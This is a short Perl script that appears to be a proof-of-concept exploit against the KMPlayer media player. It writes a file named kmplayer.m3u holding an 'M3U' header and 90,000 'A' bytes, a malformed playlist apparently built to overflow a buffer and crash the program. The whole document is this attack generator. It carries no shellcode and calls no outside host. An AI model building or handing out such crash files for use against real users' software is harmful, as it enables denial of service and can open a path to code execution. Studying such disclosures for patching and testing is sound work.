#!/usr/bin/perl
my $j = "\x41" x 90000;
my $h = "\x4D\x33\x55";
my $file = "kmplayer.m3u";
open ($File, ">$file");
print $File $h.$j;
close ($File);
